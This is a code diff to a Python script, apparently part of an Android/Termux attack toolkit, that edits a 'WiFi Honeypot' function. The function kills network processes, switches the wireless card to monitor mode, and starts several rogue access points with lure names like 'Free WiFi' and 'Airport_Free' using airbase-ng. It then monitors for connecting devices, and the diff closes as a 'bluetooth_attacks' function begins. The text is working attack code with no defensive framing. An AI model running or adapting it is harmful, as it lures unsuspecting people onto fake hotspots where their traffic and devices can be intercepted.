@@ -298,33 +298,33 @@ def create_multiple_aps(interface):
     try:
         print(f"{Fore.GREEN}[+] Starting WiFi Honeypot...{Fore.RESET}")
         
+        # Use full paths for Termux binaries
+        TERMUX_PATH = "/data/data/com.termux/files/usr/bin/"
+        
         # Setup monitor mode manually
-        os.system(f"su -c 'ifconfig {interface} down'")
-        os.system(f"su -c 'iwconfig {interface} mode monitor'")
-        os.system(f"su -c 'ifconfig {interface} up'")
+        os.system(f"su -c '{TERMUX_PATH}airmon-ng check kill'")
+        os.system(f"su -c '{TERMUX_PATH}airmon-ng start {interface}'")
         
         # Common network names
         ssid_list = ["Free WiFi", "Guest Network", "Public WiFi", "Coffee Shop", "Airport_Free"]
         
         # Create multiple APs using airbase-ng
         for i, ssid in enumerate(ssid_list):
-            channel = random.randint(1, 11)  # Random channel for each AP
-            os.system(f"su -c 'airbase-ng -e \"{ssid}\" -c {channel} {interface} &'")
+            channel = random.randint(1, 11)
+            os.system(f"su -c '{TERMUX_PATH}airbase-ng -e \"{ssid}\" -c {channel} {interface} &'")
             print(f"{Fore.GREEN}[+] Created AP: {ssid} on channel {channel}{Fore.RESET}")
-            time.sleep(1)  # Small delay between creating APs
+            time.sleep(1)
         
         print(f"\n{Fore.GREEN}[+] All APs created! Monitoring for connections...{Fore.RESET}")
         
         # Monitor for connections
         while True:
-            os.system(f"su -c 'airodump-ng {interface}'")
+            os.system(f"su -c '{TERMUX_PATH}airodump-ng {interface}'")
             
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
         os.system(f"su -c 'killall airbase-ng'")
-        os.system(f"su -c 'ifconfig {interface} down'")
-        os.system(f"su -c 'iwconfig {interface} mode managed'")
-        os.system(f"su -c 'ifconfig {interface} up'")
+        os.system(f"su -c '{TERMUX_PATH}airmon-ng stop {interface}'")
 
 def bluetooth_attacks():
     if not os.path.exists("/system/xbin/su") and not os.path.exists("/system/bin/su"):
